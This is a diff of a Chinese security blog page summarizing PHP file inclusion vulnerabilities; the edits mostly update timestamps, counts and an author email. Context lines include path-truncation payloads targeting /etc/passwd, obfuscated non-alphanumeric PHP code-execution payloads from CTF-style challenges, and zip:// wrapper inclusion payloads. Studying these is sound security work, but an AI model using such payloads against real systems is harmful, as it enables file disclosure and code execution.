@@ -91,7 +91,7 @@
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://yoursite.com/2018/11/04/文件包含漏洞总结/1.png">
 <meta property="og:image" content="http://yoursite.com/2018/11/04/文件包含漏洞总结/2.png">
-<meta property="og:updated_time" content="2018-12-05T13:13:35.407Z">
+<meta property="og:updated_time" content="2019-05-16T16:37:24.337Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="文件包含漏洞总结">
 <meta name="twitter:description" content="0x01 基本原理服务端执行用户能控制的脚本或代码，主要有本地文件包含和远程文件包含两种。   常见包含函数有：include()、require()include()是当代码执行到它的时候才加载文件,发生错误的时候只是给一个警告,然后继续往下执行require()是只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行require()一般是用于文件头包含类文件、数据库">
@@ -378,7 +378,7 @@
 <h5 id="文件路径截断"><a href="#文件路径截断" class="headerlink" title="文件路径截断"></a>文件路径截断</h5><p>/etc/passwd/passwd././././././.[…]/./././././.<br>/etc/passwd……………………….<br>(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)   </p>
 <h5 id="不包含数字和字母的payload"><a href="#不包含数字和字母的payload" class="headerlink" title="不包含数字和字母的payload"></a>不包含数字和字母的payload</h5><p>原理:$_GET[0]($_GET[1]):0为函数名，1为参数  </p>
 <p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?code=$_=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=getFlag  </span><br><span class="line">?code=$&#123;%22`&#123;&#123;&#123;%22^%22?%3C%3E/%22&#125;[%27%2b%27]();&amp;%2b=flag  </span><br><span class="line">&quot;$&quot;.(&quot;`&quot;^&quot;?&quot;).(&quot;:&quot;^&quot;&#125;&quot;).(&quot;&gt;&quot;^&quot;&#123;&quot;).(&quot;/&quot;^&quot;&#123;&quot;).&quot;[&apos;+&apos;]&quot;&amp;+=getFlag();//$_GET[&apos;+&apos;]&amp;+=getFlag();  </span><br><span class="line">?code=$&#123;&quot;!&quot;^&quot;~&quot;&#125;=&quot;]%];,&lt;&lt;&quot;^&quot;:@)&#125;@][&quot;;$&#123;&quot;!&quot;^&quot;~&quot;&#125;();</span><br></pre></td></tr></table></figure></p>
-<h5 id="其他文件协议"><a href="#其他文件协议" class="headerlink" title="其他文件协议"></a>其他文件协议</h5><p>zip协议:<a href="http://php.net/manual/zh/wrappers.compression.php" target="_blank" rel="noopener">http://php.net/manual/zh/wrappers.compression.php</a><br>payload:?file=zip://C:/payload/php.zip%23php.jpg<br>解析php.jpg是否符合php语法规则，是则执行</p>
+<h5 id="其他文件协议"><a href="#其他文件协议" class="headerlink" title="其他文件协议"></a>其他文件协议</h5><p>zip协议:<a href="http://php.net/manual/zh/wrappers.compression.php" target="_blank" rel="noopener">http://php.net/manual/zh/wrappers.compression.php</a><br>payload:?file=zip://C:/payload/php.zip%23php.jpg<br>解析php.jpg是否符合php语法规则，是则执行(配合文件上传进行利用).</p>
 <p>phar协议:<a href="http://php.net/manual/zh/wrappers.phar.php" target="_blank" rel="noopener">http://php.net/manual/zh/wrappers.phar.php</a><br>自5.30起生效<br>参考:<br><a href="https://bl4ck.in/tricks/2015/06/10/zip%E6%88%96phar%E5%8D%8F%E8%AE%AE%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6.html" target="_blank" rel="noopener">https://bl4ck.in/tricks/2015/06/10/zip%E6%88%96phar%E5%8D%8F%E8%AE%AE%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6.html</a></p>
 <h3 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h3><p><a href="http://www.cnblogs.com/iamstudy/articles/include_file.html" target="_blank" rel="noopener">http://www.cnblogs.com/iamstudy/articles/include_file.html</a><br><a href="http://www.freebuf.com/articles/web/119150.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/119150.html</a><br><a href="https://blog.csdn.net/qq_33020901/article/details/78706764" target="_blank" rel="noopener">https://blog.csdn.net/qq_33020901/article/details/78706764</a><br><a href="https://www.liuxianglai.top/?p=145" target="_blank" rel="noopener">https://www.liuxianglai.top/?p=145</a><br><a href="http://blog.51cto.com/tdcqvip/1958654" target="_blank" rel="noopener">http://blog.51cto.com/tdcqvip/1958654</a><br><a href="https://www.freebuf.com/column/148886.html" target="_blank" rel="noopener">https://www.freebuf.com/column/148886.html</a><br><a href="https://www.cnblogs.com/iamstudy/category/729449.html" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/category/729449.html</a></p>
 
@@ -504,7 +504,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-count">22</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -526,7 +526,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-count">9</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -553,7 +553,7 @@
                   </span>
                 
                   <span class="links-of-author-item">
-                    <a href="mailto:1592129863@qq.com" target="_blank" title="E-Mail">
+                    <a href="mailto:tusk1@foxmail.com" target="_blank" title="E-Mail">
                       
                         <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                   </span>
